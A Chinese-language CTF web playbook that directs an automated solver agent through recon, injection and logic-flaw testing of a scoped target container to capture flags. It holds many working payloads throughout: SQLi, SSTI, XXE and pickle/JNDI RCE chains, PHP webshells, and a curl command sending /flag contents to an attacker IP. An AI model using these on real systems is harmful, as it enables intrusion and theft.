# Web 域 Playbook

**使命:打靶机 Web 面,拿 `flag{...}` 立即追加写 `flags.json`(收件箱,runtime 负责提交)。**
读者是执行层 solver:照表执行,不要自由发挥。被拦/被过滤 → 切「WAF 绕过技能」(同 prompt 内),不要换洞类。

## 0. 硬纪律(违反=事故)

- **范围 = `container_addr`(input.json 里的 IP:端口)**。只打给定地址与它暴露的服务,不扫网段、不扫其他端口、不碰平台。
- flag 出现在命令输出里即可(引擎自动收集),不需要任何提交动作。
- 无外网出网:回调一律监听攻击机本机 IP(`ip -4 addr show` 取内网地址);禁 Collaborator/interactsh/公网 DNS。靶机连不回来就改盲打(延迟/响应长度判定)。
- 临时文件全放 `tmp/`;每个响应要留痕:`curl ... -o tmp/resp.html` 或 `-D tmp/h.txt`,复盘靠它们。
- 并发 ≤4(`dirsearch -t 4`、`sqlmap --threads 2`、循环用 `xargs -P4`)。唯一例外:竞态验证单接口短爆发(§6.12)。
- 禁大字典(rockyou 级)、禁公开 nuclei 全树扫描、禁无引导 fuzz(runtime 会拦截)。只许精选词表 + 定向验证。
- 拿到 flag 是最高优先级:先写收件箱,再继续挖剩余 flag。

## 1. 工具表(全部可直接跑;`T` = `http://IP:PORT`)

| 工具 | 用途 | 命令示例 |
|---|---|---|
| curl | 基线/重放/带会话 | 基线:`curl -sS -i -o tmp/index.html -D tmp/index.h "$T/"`<br>登录:`curl -sS -i -c tmp/cj.txt -X POST -d 'user=admin&pass=admin' "$T/login"`<br>带会话访问:`curl -sS -b tmp/cj.txt "$T/admin"`<br>JSON:`curl -sS -i -H 'Content-Type: application/json' -d '{"user":"a"}' "$T/api/login"` |
| httpx | 批量探活/指纹 | `httpx -u "$T" -title -status-code -tech-detect -ip -follow-redirects -no-color`<br>`httpx -l tmp/paths-200.txt -title -tech-detect -no-color` |
| dirsearch | 内容发现(小词表) | `dirsearch -u "$T/" -w /opt/knowledge/wordlists/paths.txt -t 4 --timeout 10 --random-agent -x 404 -o tmp/dirsearch.txt`<br>已知 PHP 栈加 `-e php`;确认 200/403 的路径逐个 curl 复看,403 是"存在但拦"必看 |
| sqlmap | 注入自动化(确认后) | GET:`sqlmap -u "$T/item?id=1" -p id --batch --level=2 --risk=1 --threads=2 -o tmp/sqlmap.txt`<br>POST:`sqlmap -r tmp/req.txt -p username --batch --technique=BT --threads=2 --flush-session`<br>提取:`... --dump -D <库> -T <表>`;被拦时 `--tamper=space2comment`(只挑一个),更深变形走 WAF 技能 §1 |
| nuclei | CVE 定向验证(先 grep 后跑) | `grep -rli tomcat $(find / -maxdepth 5 -type d -name cves -path '*nuclei-templates*' 2>/dev/null \| head -1) \| head` → 挑中的模板文件逐个:`nuclei -t <模板.yml> -u "$T" -silent -severity critical,high`<br>命中后必须 curl 手工重放 PoC 确认,别只信扫描器 |
| playwright-cli | 登录/会话/XSS 受害浏览器 | `playwright-cli open "$T/login"` → `playwright-cli snapshot`(读结构)→ `playwright-cli fill e5 'admin'` → `playwright-cli click e12` → `playwright-cli state-save tmp/browser.json`;恢复:`playwright-cli state-load tmp/browser.json`;读 cookie:`playwright-cli cookie-list`<br>其余动词以 `playwright-cli --help` 为准,不要猜 |
| tesseract | 验证码 OCR | 见 §7 |
| 辅助 | 搜索/编码 | `grep -rL`、`python3 -c 'import urllib.parse;print(urllib.parse.quote("…"))'`、`base64 -d`、`jq` |

登录态全站复用 `tmp/cj.txt`(curl)与 `tmp/browser.json`(playwright),每题一份,重登浪费预算。

## 2. 标准执行序(S0→S6,每步有"有戏信号",命中即深入)

### S0 读题(2 分钟)
做什么:读 `input.json`(unique_code、container_addr、flag 进度)与题面简报;提取所有 URL/参数/提示词/附件。
有戏信号:简报点名技术栈("用 Flask 写的")、点名单一功能点、给源码附件——有源码先读源码,漏洞基本写在那里。

### S1 指纹识别
做什么:
```bash
curl -sS -i "$T/" | head -40          # 看头、Set-Cookie、Server、跳转
curl -sS -i "$T/nonexist-$(date +%s)" # 看 404 页面(默认错误页=框架指纹)
curl -sS "$T/robots.txt"; curl -sS "$T/favicon.ico" | md5sum
httpx -u "$T" -title -tech-detect -status-code -no-color
```
有戏信号:Set-Cookie 名(PHPSESSID/JSESSIONID/remember_web/connect.sid)→ 直接定栈;错误页带堆栈/版本号;favicon md5 可与已知产品比对。像已知产品 → nuclei grep 工作流(§1)。

### S2 内容发现
做什么:dirsearch 跑精选 paths.txt(§1 命令);手工补:`/swagger` `/api-docs` `/api/swagger.json` `/doc` `/admin` `/backup` `/.git/HEAD` `/.env` `/.DS_Store` `/app.py` `/index.php.bak` `/WEB-INF/web.xml` `/actuator` `/druid/index.html`。
有戏信号:200 的新路径、`/.git/` 存在(立即 `git clone` 或 `curl` 逐个拉 `logs/HEAD` 还原源码)、swagger 全量接口清单、`.env` 直接给 flag/密钥。发现后台先试默认口令(§4 字典)再谈绕过。

### S3 认证面分析
做什么:
1. 登录页测万能密码(sqli.txt 里的 `' or 1=1--` 系,手填不要喷);
2. 有验证码 → §7 OCR;OCR 三连错改抓码分析或换登录口(重置/注册/验证逻辑);
3. JWT/token 类:base64 解三段看 alg 与 payload(`echo <seg> | base64 -d 2>/dev/null`),alg=none/弱密钥直接伪造 admin;
4. 注册/找回流程走一遍:批量注册、找回码可预测、验证码回显。
有戏信号:万能密码命中、401 页面响应差异(用户枚举)、`WWW-Authenticate: Bearer` + 可解 payload、注册即有低权账号(为 §6.12 越权备料:有第二账号才能测横向)。

### S4 注入面(S2/S3 收集的所有参数,逐个过快探矩阵)
做什么:对每个参数发 ≤6 发快探(§6 各类"先试"列),响应存 tmp/ 对比。矩阵:`'`(SQLi)、`{{7*7}}` 与 `${7*7}`(SSTI)、`;id` 与 `$(id)`(命令)、`http://127.0.0.1:80/`(SSRF/代理)、`../../../../etc/passwd`(LFI)、`<svg onload=alert(1)>`(XSS 回显点)、登录参数 `'$ne'`(NoSQL)。
有戏信号:任何一发引起报错/延迟/长度跳变 → 锁定该类,跳 §6 对应小节走确认→提取。被过滤/403 → WAF 技能,洞类不变。

### S5 业务逻辑
做什么:§6.12 全项(IDOR 枚举、两账号横向、竞态、支付篡改、流程跳步)。代码审计思路:登录后每个"我的 X"接口都把 id 换成别人 id 试一发。
有戏信号:低权账号读到高权资源、负数/超大数量被接受、校验只在前端。

### S6 收尾
做什么:
```bash
grep -raoEi 'flag\{[^}]{1,512}\}' tmp/ | sort -u      # 全量扫一遍所有留痕响应
grep -aoEi 'flag|ctf|key\{' tmp/*.html tmp/*.json | sort -u   # 疑似变形 flag 关键字
```
对照 input.json 进度:还剩 flag 未拿 → 回 S4 换下一类注入面 / S5 逻辑面;全部拿到 → 结束(容器 close 由 runtime 管)。
有戏信号:任何响应里出现 flag 正则即写收件箱,哪怕看着像 decoy。

## 3. 全局顺序心智图

指纹(定产品→CVE 通道)→ 内容发现(源码/备份/swagger 是捷径,优先级高于黑盒猜)→ 认证(进去才有面)→ 注入快探(广撒 6 发/参数)→ 逻辑(人味测试)→ 扫尾。**捷径优先**:源码泄露 > swagger 接口清单 > 默认口令 > 黑盒注入 > 盲猜。

## 4. 验证码 / 登录处理(OCR 参数级流程)

```bash
# 1. 下载验证码(curl 会话要与登录 POST 同 cookie jar)
curl -sS -c tmp/cj.txt -o tmp/cap.png "$T/captcha"
# 2. 预处理:灰度→放大→二值化(多数 CTF 验证码这一步就够)
convert tmp/cap.png -colorspace Gray -resize 300% -threshold 55% tmp/cap2.png
# 3. 识别:单行短码用 --psm 7
tesseract tmp/cap2.png stdout -l eng --psm 7 | tr -d ' '
# 4. 带着 OCR 结果登录(同一 cookie jar!否则验证码对不上 session)
curl -sS -b tmp/cj.txt -c tmp/cj.txt -X POST -d "user=admin&pass=admin&captcha=AB12" "$T/login"
```
- 重试阶梯:连错 → 先换预处理(`-threshold 40%` / `-resize 400%` / `-median 3` 降噪)再换 `--psm 8` → 最后 `--psm 6`(多行)。**短码别配 `tessedit_char_whitelist`**,易把 `A7K2` 认成 `ATK2`。
- 提交前去 OCR 插入的空白(`tr -d ' '`);OCR 混淆字符常见错认:O↔0、I↔1、Z↔2,错时手工替换重试。
- 图中直接有 flag(截图/canvas)同样走本流程。
- 登录请求优先用 playwright 走真浏览器(§1),OCR 只取码;防止前端 JS 加密密码导致 curl 构造不出来。

## 5. 字典政策

| 文件(在 `/opt/knowledge/wordlists/`,不在就 `find / -maxdepth 4 -name paths.txt 2>/dev/null`) | 用途 | 上限 |
|---|---|---:|
| paths.txt | 目录/后台/备份/配置泄露 | ~300 |
| usernames.txt + passwords.txt | 登录爆破,小表笛卡尔积 | 50×300 |
| sqli.txt | 万能密码/手测 payload(手填,不进爆破) | ~170 |
| lfi.txt | 穿越/wrapper 载荷 | ~120 |

- 爆破仅限登录框,`dirsearch/hydra` 类并发 ≤4;连续 ~500 发无命中就停,换思路。
- **禁** rockyou/SecLists 全量/在线下载词表。靶机是共享容器,打崩=全部人丢分。

## 6. 症状 → 手法对照表(核心资产:锁类→确认→提取)

### 6.1 SQLi
- 入口特征:参数拼查询(搜索/排序/ID/筛选/Cookie/JSON 字段);响应差异(`id=1` vs `id=1'` 长度跳变/500);报错含 SQL 片段。
- 先试:数字型 `1` vs `1+1`(回显算术结果=数字注入)、引号闭合逐个试 `'` `"` `')` `'))`、布尔 `AND 1=1`/`AND 1=2` 差异、报错回显。
- 确认:
```bash
# union 型:先定列数,ORDER BY 报错到 N
curl -sS "$T/item?id=1%20order%20by%203--" -o tmp/o3.html; curl -sS "$T/item?id=1%20order%20by%204--" -o tmp/o4.html; wc -c tmp/o3.html tmp/o4.html
# 时间型:无回显无布尔差异时
curl -sS -w '%{time_total}\n' -o /dev/null "$T/item?id=1%20AND%20SLEEP(3)--"
# 自动化兜底(手工确认后):
sqlmap -r tmp/req.txt -p id --batch --threads=2
```
- 提取(拿 flag):
```bash
curl -sS "$T/item?id=0%20UNION%20SELECT%201,group_concat(table_name),3%20FROM%20information_schema.tables%20WHERE%20table_schema=database()--"
curl -sS "$T/item?id=0%20UNION%20SELECT%201,group_concat(flag),3%20FROM%20<表名>--"   # 列名:flag/flag value 可先试常见名
```
SQLite 换 `sqlite_master`;PG 换 `pg_catalog.pg_tables` + `pg_sleep`;MSSQL `WAITFOR DELAY '0:0:3'` + `sysobjects`。盲注逐字符提取用 sqlmap 自动跑,别手写二分循环。

### 6.2 XSS(反射 / 存储 / DOM)
- 入口特征:输入回显在页面(反射);留言/资料等持久位置(存储);URL `#hash` 被 JS 读进 `innerHTML/eval/document.write`(DOM——grep 源码 `location.hash|search` 的 sink)。
- 先试按上下文(先看回显点在 HTML 正文、属性值、JS 字符串还是 URL):
| 回显位置 | 逃逸首试 |
|---|---|
| HTML 正文 | `<svg onload=alert(1)>` `<img src=x onerror=alert(1)>` |
| 属性值内 | `"><svg onload=alert(1)>` `'-alert(1)-'`(JS 属性) `" onmouseover=alert(1) x="` |
| JS 字符串内 | `';alert(1)//` `</script><svg onload=alert(1)>`(在 script 块中) |
| href/src 值 | `javascript:alert(1)` `data:text/html;base64,…` |
- 确认与提取:playwright 浏览器就是受害者(镜内已带 Chromium):
```bash
playwright-cli open "$T/page?x=<svg onload=alert(1)>"
playwright-cli snapshot                  # 看是否渲染/弹窗痕迹
playwright-cli eval '() => document.cookie'   # 取赃;flag 常在受害者 cookie/页面/接口返回
```
存储型 XSS 靶上没有真人 admin 时:看 bot 提示(简报会写"管理员会访问"),payload 改成把 `document.cookie`/页面内容外带——无出网就写进自己可控的存储点(留言/头像 URL 参数),再读回来。被过滤先查关键词黑名单,变形走 WAF 技能 §2。

### 6.3 SSRF
- 入口特征:输入是 URL(预览/抓取/导入/webhook/头像/翻译/pdf 生成);参数带 host/ip/port。
- 先试:`http://127.0.0.1/`(看响应差异)、`http://127.0.0.1:PORT/`(靶机自身其他端口)、`file:///etc/passwd`(协议是否换掉)。
- 确认(回调判定,无出网):
```bash
ip -4 addr | grep inet                 # 取攻击机内网 IP
nc -lvnp 8000 &                        # 或 python3 -m http.server 8000
# 靶机参数里填 http://<攻击机IP>:8000/probe1 —— 回连打到 = 出站通,可打内网
```
- 内网端口速查(命中哪个就转哪个工具):6379 Redis(gopher 打未授权写 webshell/计划任务)、3306 MySQL、11211 memcached、9200 ES、2375 docker API(=直接 RCE)、8500 consul、8080/9090 内部管理台。
- 提取:优先 `file:///flag`、`file:///flag.txt`、云形态打 `http://169.254.169.254/latest/meta-data/`;Redis 未授权走 gopher 打 RCE 后 `cat /flag*`(gopher payload 用 gopherus 离线生成,别手拼 CRLF)。

### 6.4 LFI / 文件读取 / RFI
- 入口特征:`?file= ?page= ?path= ?lang= ?tpl=`;下载接口 `?download=`;模板包含。
- 先试:`../../../../etc/passwd` → `root:` 出现即中;绝对路径 `/etc/passwd`;被剥 `../` 试 `....//` 与 `..;/`。
- 确认:PHP 环境先读源码定漏洞点:`php://filter/convert.base64-encode/resource=index`(输出 base64 → `base64 -d`)。
- LFI→RCE 四板斧(按序试,拿 shell 后 cat flag):
| 路 | 位置 |
|---|---|
| 日志投毒 | UA 塞 `<?php system($_GET[1]);?>` 再包含 `/var/log/nginx/access.log`、`/var/log/apache2/access.log` |
| 会话文件 | 包含 `/var/lib/php/sessions/sess_<PHPSESSID>`(session 内容带 payload) |
| proc 自身 | `/proc/self/environ`(UA 当载体)、`/proc/self/fd/N`、`/proc/self/cmdline` |
| filter chain | php filter 链无需文件直接 RCE(用离线 generator 生成,查 `/opt/knowledge`) |
- 提取:直接 `../../flag` `../../flag.txt` `/proc/self/cwd/flag` 逐个试,别急着上 RCE;flag 文件名猜不到 → 先 RCE 再 `find / -name '*flag*' 2>/dev/null`。

### 6.5 命令注入 / RCE
- 入口特征:ping/dig/nslookup/traceroute 功能;文件名处理(压缩/转码/删除);CSV 导出;任何"系统操作"按钮。
- 先试:`;id`、`|id`、`` `id` ``、`$(id)`、`%0aid`(换行)。无回显试延迟:`;sleep 5` 测响应时间。
- 确认与提取(无出网外带三板斧):
```bash
# 1) 写进 web 目录再 HTTP 读回(先确认 web 根,常见 /var/www/html)
;cat /flag* > /var/www/html/f.txt     # 然后 curl "$T/f.txt"
# 2) 回连攻击机(有出站时)
;curl http://<攻击机IP>:8000/$(cat /flag* | base64 -w0)
# 3) 盲打:;sleep 5 确认存在后用时间信道逐字符(交给 sqlmap 的 --os-shell 或 os-cmd)
```
- 空格/关键字被过滤 → WAF 技能 §5。拿到执行先 `find / -maxdepth 2 -name '*flag*' 2>/dev/null; ls -la /`。

### 6.6 SSTI(模板注入)
- 入口特征:输入直接进渲染的页面(404 页、邮件模板、昵称、个人简介);用了 Jinja2/Twig/Freemarker 类框架的渲染参数。
- 探针树(逐个发,看算术结果):
| 发送 | 结果 | 引擎 |
|---|---|---|
| `{{7*7}}` | 49 | Jinja2/Twig/Pebble → 再发 `{{7*'7'}}`:`7777777`=Jinja2,`49`=Twig |
| `${7*7}` | 49 | Freemarker/Mako/Velocity → `#{7*7}` 也通=Velocity |
| `<%= 7*7 %>` | 49 | ERB(Ruby) |
| `{7*7}` | 49 | Smarty(PHP) |
| `*{7*7}` / `__${7*7}__` | 49 | Thymeleaf |
- 确认=RCE 常用链(报错/回显任一出现即成立):
| 引擎 | 首选链 |
|---|---|
| Jinja2 | `{{ lipsum.__globals__['os'].popen('cat /flag*').read() }}` |
| Twig | `{{ ['cat /flag*'] \|map('system') \|join }}` |
| Smarty | `{system('cat /flag*')}` |
| ERB | `<%= \`cat /flag*\` %>` |
| Mako | `${ __import__('os').popen('cat /flag*').read() }` |
| Freemarker | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag*")}` |
| Thymeleaf | `__${T(java.lang.Runtime).getRuntime().exec("id")}__::x` |
- `{{`/`__class__` 被过滤 → WAF 技能 §6 换记号。Flask app 拿到 SSTI 也可读 `{{ config }}` 里常藏 SECRET_KEY/flag。

### 6.7 XXE
- 入口特征:接口收 XML(含 `application/xml`、SOAP、SVG 上传、xlsx/docx 导入解析、`<soapenv>`)。
- 先试(无出网版,file:// 直读):
```xml
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag">]><r>&x;</r>
```
- 确认:文件不存在时报错差异、内容出现在响应/报错里即中。文件路径猜不到先读 `file:///etc/passwd`、`file:///<CWD>/app.py`(报错里常泄路径)。
- 无回显(盲 XXE)用报错外带,不用外网 OOB:
```xml
<!DOCTYPE r [<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % wrap "<!ENTITY &#x25; err SYSTEM 'file:///noexist_/%file;'>">%wrap;%err;]>
<r>x</r>
```
→ 报错信息里带出文件内容。常规实体被拦换参数实体/PUBLIC/UTF-16,见 WAF 技能 §7。

### 6.8 NoSQL 注入
- 入口特征:Mongo/文档库(响应像 JSON API)、登录框、`Content-Type: application/json`。
- 先试:JSON 体 `{"user":{"$ne":""},"pass":{"$ne":""}}`;表单体 `user[$ne]=&pass[$ne]=`;`$regex` 探测。
- 确认与提取(盲注逐字符枚举密码/字段):
```bash
for c in a b c d e f 0 1 2 3 4 5 6 7 8 9; do
  r=$(curl -sS "$T/login?user=admin&pass[\$regex]=^$c" -o /dev/null -w '%{http_code}')
  [ "$r" = 302 ] && echo "first char: $c"
done
```
登录绕过成功后页面/接口里找 flag;`$where`/运算符被拦换算子,见 WAF 技能 §8。

### 6.9 文件上传
- 入口特征:头像/附件/导入功能;前端限制 = 直接改包;有上传路径回显。
- 先试顺序:① 直接传 `.php` 看回显路径;② 被拒换 `.php5/.phtml/.php.jpg/.php./.Php`;③ MIME 改 `image/jpeg`(Content-Type 只看包内 part 头);④ 内容检测加魔数头:`GIF89a` + `<?php system($_GET[1]);?>`。
- 确认:访问回显路径;路径没回显就 dirsearch 上传目录(`uploads/` `upload/` `static/`)或按日期猜;找得到但没执行 → 看 `.htaccess`/`.user.ini` 可不可传(传了就能把 jpg 变 PHP)。
- 提取:`<?php system('cat /flag*');?>` 或短标签 `<?=system('cat /flag*');?>`(内容过滤 `<?php` 时);传 webshell 走内网域时转渗透域 playbook。
- SVG 传上去若内联预览 = 存储型 XSS 入口(§6.2)。

### 6.10 反序列化 / JNDI(Java/PHP/Python)
- 入口特征:Cookie/base64 大字段以这些前缀开头、报错含 `InvalidClassException`/`unserialize()`、Java 栈报 `jndi`/`lookup`、参数进 `ObjectInputStream`。
- 魔数速判表:
| 前缀 | 类型 | 生成 |
|---|---|---|
| `rO0AB`(base64)/`aced`(hex) | Java 序列化 | `java -jar "$(find / -name 'ysoserial*.jar' 2>/dev/null\|head -1)" CommonsCollections6 'cat /flag*' \| base64 -w0` |
| `H4sI` | gzip 包裹(先 `base64 -d \| gunzip` 验) | ysoserial 后接管道 `\| gzip` |
| `Tzo`/`O:`(base64/原文) | PHP 对象 | `php -r 'echo base64_encode(serialize(<按源码构造>));'` |
| `gASV` | Python pickle | 见下 |
| `AAEAAAD` | .NET | TypeConfuseDelegate gadget |
- Python pickle 一行生成:
```bash
python3 -c "import os,pickle,base64;class E:__reduce__=lambda s:(os.system,('cat /flag*',));print(base64.b64encode(pickle.dumps(E())).decode())"
```
- JNDI(Log4j/Spring/反序列化 lookup):payload `${jndi:ldap://<攻击机IP>:1389/x}`,起本地 LDAP 服务(rogue-jndi,命令编进响应):
```bash
java -jar "$(find / -name '*rogue*jndi*.jar' 2>/dev/null | head -1)" --command 'cat /flag* > /app/static/f.txt' --hostname <攻击机IP>
```
被拦/嵌套变形见 WAF 技能 §10。PHP 反序列化先读源码找 `__destruct/__wakeup` 链,类名属性按源码构造,`php -r` 现生成,别套模板。

### 6.11 CRLF / 开放重定向
- 入口特征:参数进 `Set-Cookie`/`Location` 头(`?next= ?url= ?redirect=`);登录后跳转参数。
- 先试:`%0d%0aSet-Cookie:%20x=1`(CRLF);重定向白名单绕过:`//evil` `/\evil` `https://白名单@evil` `https://evil.白名单域` `.白名单域`(子域拼)、`%2f%2f`。
- 确认:响应头出现注入的 header;重定向 Location 指向受控域。
- 价值:开放重定向本身分低,主要当 SSRF 跳板(§6.3 的 302 跳转法)与 XSS 载体(`javascript:` 进 Location)。

### 6.12 逻辑漏洞(越权 / 竞态 / 支付 / 流程)
- **越权(IDOR)**:登录 A,枚举资源 id:
```bash
for i in $(seq 1 30); do curl -sS -b tmp/cj.txt "$T/api/order/$i" | grep -aoE 'flag\{[^}]*\}|"owner":"[^"]*"' && echo "  <- id=$i"; done
```
两账号横向:注册 A(低权)+ 拿 B(admin 类)资源,A 的 cookie + B 的资源路径/参数。改 HTTP 方法(GET→POST→PUT)、加 `X-Original-URL: /admin`、路径归一(`/admin/../api/x`)都是横向加速器。
- **竞态**(唯一允许 -P8 短爆发):单接口 ≤30 发、打完即停:
```bash
seq 30 | xargs -P8 -I{} curl -sS -b tmp/cj.txt -X POST -d 'amount=1' "$T/coupon/redeem" -o /dev/null
```
典型场景:优惠券重复用、余额双花、投票刷票、验证码先取后验。
- **支付/数量**:`price=-1`、`price=0.0001`、数量负数/超大/小数、总价改包(前端算价)、重放扣款请求但改订单号、币种字段换。
- **流程跳步**:直接 POST 最终确认接口(跳过校验步骤)、改响应布尔值重放(把 `{"success":false}` 改 true 提交)、验证码/OTP 重放。
- **越权拿 flag 位**:admin 面板、他人订单详情、导出接口(`?export=all`)是三大高频 flag 位。

## 7. 卡壳出口

同一题 20 分钟无进展:① 回 S2 看有没有漏掉的新路径/参数;② 换下一类注入面快探;③ 像已知产品 → nuclei grep CVE 通道;④ 仍无果记入失败清单(题目、已试、现象),等 loop 深挖会话。**不要**在同一入口喷同一类 payload 超过 20 发——那是 WAF 在过滤,去查 WAF 技能,不是再来一发。
